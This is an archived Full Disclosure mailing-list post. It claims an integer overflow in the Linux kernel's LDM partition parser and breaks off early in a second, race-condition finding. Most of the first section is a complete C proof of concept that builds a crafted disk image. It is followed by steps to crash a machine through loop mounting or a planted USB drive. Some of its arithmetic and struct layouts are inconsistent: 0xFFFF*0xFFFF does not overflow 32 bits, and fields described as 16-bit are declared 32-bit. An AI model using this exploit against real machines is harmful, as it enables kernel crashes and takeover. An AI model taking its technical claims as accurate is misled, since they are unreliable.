---
title: Linux Kernel Block Subsystem Vulnerabilities
url: https://seclists.org/fulldisclosure/2026/Jan/0
source: Full Disclosure
date: 2026-01-06
fetch_date: 2026-01-07T03:30:42.907220
---

# Linux Kernel Block Subsystem Vulnerabilities

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

![Previous](/images/left-icon-16x16.png)
[By Date](date.html#0)
[![Next](/images/right-icon-16x16.png)](1)

![Previous](/images/left-icon-16x16.png)
[By Thread](index.html#0)
[![Next](/images/right-icon-16x16.png)](1)

![](/shared/images/nst-icons.svg#search)

# Linux Kernel Block Subsystem Vulnerabilities

---

*From*: Agent Spooky's Fun Parade via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Mon, 29 Dec 2025 20:20:00 +0000

---

```
================================================================================
FULL DISCLOSURE: Linux Kernel Block Subsystem Vulnerabilities
Date: 2025-12-29
Affected: Linux Kernel (all versions with affected code)
================================================================================

================================================================================
[1/4] Integer Overflow in LDM Partition Parser - Heap Overflow
================================================================================

VULNERABILITY SUMMARY
---------------------
Type: Integer Overflow leading to Heap Buffer Overflow
File: block/partitions/ldm.c:1247
Severity: HIGH (7.8 CVSS)
Impact: Local privilege escalation, kernel code execution
Attack Vector: Malicious disk image / USB device

TECHNICAL DETAILS
-----------------
The LDM (Logical Disk Manager) partition parser contains an integer overflow
vulnerability in the VBLK fragment reassembly code. When parsing Windows
dynamic disks, the kernel allocates a buffer using:

    f = kmalloc(sizeof(*f) + size * num, GFP_KERNEL);

Where both 'size' and 'num' are attacker-controlled 16-bit values read from
the disk. When size=0xFFFF and num=0xFFFF, the multiplication overflows:

    0xFFFF * 0xFFFF = 0xFFFE0001 (truncated to 32-bit)
    sizeof(*f) + 0xFFFE0001 = small allocation

The kernel allocates a small buffer but later writes up to 64KB of data into
it, causing a heap buffer overflow.

AFFECTED CODE (block/partitions/ldm.c)
--------------------------------------
Line 1247:
    f = kmalloc(sizeof(*f) + size * num, GFP_KERNEL);

Line 461 (bounds check also vulnerable):
    if ((vm->vblk_size * vm->vblk_offset) > 65536) {

PROOF OF CONCEPT
----------------
/*
 * ldm_overflow_poc.c - LDM Integer Overflow PoC
 * Creates a malicious disk image triggering the overflow
 *
 * Compile: gcc -o ldm_poc ldm_overflow_poc.c
 * Usage: ./ldm_poc output.img && losetup /dev/loop0 output.img
 *
 * WARNING: This WILL crash/corrupt your kernel. Use in VM only.
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

/* LDM structures */
#define LDM_MAGIC "PRIVHEAD"
#define VBLK_MAGIC "VBLK"

struct ldm_privhead {
    char magic[8];
    uint32_t version;
    uint64_t disk_id;
    char host_id[64];
    char disk_group_id[64];
    char disk_group_name[32];
    uint32_t logical_disk_start;
    uint32_t logical_disk_size;
    uint32_t config_start;
    uint32_t config_size;
    uint32_t num_tocs;
    uint32_t toc_size;
    uint32_t num_configs;
    uint32_t config_record_size;
    uint32_t num_logs;
    uint32_t log_size;
} __attribute__((packed));

struct ldm_vmdb {
    char magic[4];           /* "VMDB" */
    uint32_t last_seq;
    uint32_t vblk_size;      /* Controlled - use 0xFFFF */
    uint32_t vblk_offset;    /* Controlled - use 0xFFFF */
    uint16_t num_vblks;
    /* ... */
} __attribute__((packed));

struct ldm_vblk_head {
    char magic[4];           /* "VBLK" */
    uint32_t seq;
    uint32_t group;
    uint16_t rec_num;        /* Fragment number */
    uint16_t num_recs;       /* Total fragments - use large value */
    /* ... */
} __attribute__((packed));

void create_malicious_ldm_image(const char *filename) {
    int fd = open(filename, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) {
        perror("open");
        exit(1);
    }

    /* Create 2MB sparse image */
    ftruncate(fd, 2 * 1024 * 1024);

    /* Write LDM PRIVHEAD at sector 6 (byte offset 3072) */
    struct ldm_privhead privhead = {0};
    memcpy(privhead.magic, LDM_MAGIC, 8);
    privhead.version = 0x0002000C;  /* Version 2.12 */
    privhead.config_start = 1;
    privhead.config_size = 2048;

    lseek(fd, 6 * 512, SEEK_SET);
    write(fd, &privhead, sizeof(privhead));

    /* Write VMDB with overflow values */
    struct ldm_vmdb vmdb = {0};
    memcpy(vmdb.magic, "VMDB", 4);
    vmdb.vblk_size = 0xFFFF;    /* OVERFLOW VALUE */
    vmdb.vblk_offset = 0xFFFF;  /* OVERFLOW VALUE */
    vmdb.num_vblks = 100;

    lseek(fd, 8 * 512, SEEK_SET);  /* VMDB location */
    write(fd, &vmdb, sizeof(vmdb));

    /* Write VBLK fragments that trigger reassembly overflow */
    struct ldm_vblk_head vblk = {0};
    memcpy(vblk.magic, VBLK_MAGIC, 4);
    vblk.seq = 1;
    vblk.group = 1;
    vblk.rec_num = 0;
    vblk.num_recs = 0xFFFF;  /* Large fragment count */

    /* Write multiple fragments to trigger reassembly */
    for (int i = 0; i < 10; i++) {
        vblk.rec_num = i;
        lseek(fd, (16 + i) * 512, SEEK_SET);
        write(fd, &vblk, sizeof(vblk));

        /* Fill rest of sector with controlled data */
        char payload[512 - sizeof(vblk)];
        memset(payload, 'A', sizeof(payload));
        write(fd, payload, sizeof(payload));
    }

    close(fd);
    printf("[+] Created malicious LDM image: %s\n", filename);
    printf("[!] WARNING: Mounting this image WILL crash the kernel\n");
}

int main(int argc, char **argv) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <output.img>\n", argv[0]);
        return 1;
    }

    create_malicious_ldm_image(argv[1]);

    printf("\nReproduction steps:\n");
    printf("1. Copy image to target VM\n");
    printf("2. sudo losetup /dev/loop0 %s\n", argv[1]);
    printf("3. sudo partprobe /dev/loop0  # TRIGGERS CRASH\n");
    printf("\nOr:\n");
    printf("1. Write image to USB drive\n");
    printf("2. Plug USB into target machine\n");
    printf("3. Kernel auto-probes partitions -> CRASH\n");

    return 0;
}

REPRODUCTION STEPS
------------------
1. Compile the PoC on any Linux system:
   $ gcc -o ldm_poc ldm_overflow_poc.c

2. Create the malicious image:
   $ ./ldm_poc malicious.img

3. In a VM (DO NOT RUN ON PRODUCTION):
   $ sudo losetup /dev/loop0 malicious.img
   $ sudo partprobe /dev/loop0

4. Kernel will crash with heap corruption

Alternative (USB attack vector):
1. Write malicious.img to USB drive:
   $ sudo dd if=malicious.img of=/dev/sdX bs=1M
2. Plug USB into target machine
3. Kernel crashes during automatic partition probing

IMPACT
------
- Heap buffer overflow with controlled size and data
- Kernel code execution possible via heap spray
- Physical access attack via malicious USB
- No user interaction required (auto-probe)

SUGGESTED FIX
-------------
Replace vulnerable allocation with overflow-safe version:

-   f = kmalloc(sizeof(*f) + size * num, GFP_KERNEL);
+   if (check_mul_overflow(size, num, &alloc_size) ||
+       check_add_overflow(alloc_size, sizeof(*f), &alloc_size)) {
+       ldm_error("VBLK allocation overflow");
+       return false;
+   }
+   f = kmalloc(alloc_size, GFP_KERNEL);

================================================================================
[2/4] Request Queue Reference Counting Race Condition
================================================================================

VULNERABILITY SUMMARY
---------------------
Type: TOCTOU Race Condition / Use-After-Free
File: block/blk-core.c:278-284
Severity: MEDIUM (5.5 CVSS)
Impact: Kernel crash, potential priv...